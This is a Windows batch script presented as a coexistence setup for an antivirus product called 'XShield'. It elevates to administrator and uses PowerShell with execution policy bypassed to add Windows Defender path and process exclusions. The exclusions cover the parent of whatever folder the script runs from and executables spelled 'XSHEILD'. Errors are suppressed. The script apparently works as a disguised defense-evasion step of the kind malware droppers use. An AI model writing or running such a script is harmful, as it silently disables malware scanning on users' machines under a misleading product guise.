@echo off
:: Future Finger Technologies - XShield Defender Coexistence Setup
title XShield Defender Coexistence Activator
setlocal EnableDelayedExpansion

echo ==========================================================
echo   XSHIELD ENDPOINT ANTIVIRUS - DEFENDER COEXISTENCE SETUP
echo ==========================================================
echo.

:: Check for Administrative Privileges
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [i] Administrator privileges required. Requesting UAC elevation...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

echo [1/3] Adding Windows Defender Path Exclusions...
powershell -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%LOCALAPPDATA%\XSHEILD', '%ProgramFiles%\XShield', '%~dp0..' -ErrorAction SilentlyContinue"
if %errorlevel% equ 0 (
    echo   [+] Excluded directories successfully.
) else (
    echo   [-] Could not set path exclusion.
)

echo.
echo [2/3] Adding Windows Defender Process Exclusions...
powershell -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionProcess 'XSHEILD.exe', 'XSHEILD_Setup.exe', 'xshield_svc.exe' -ErrorAction SilentlyContinue"
if %errorlevel% equ 0 (
    echo   [+] Excluded processes successfully.
) else (
    echo   [-] Could not set process exclusion.
)

echo.
echo [3/3] Harmonization Completed!
echo ==========================================================
echo   XShield is now authorized to run without Defender interference.
echo ==========================================================
echo.
pause
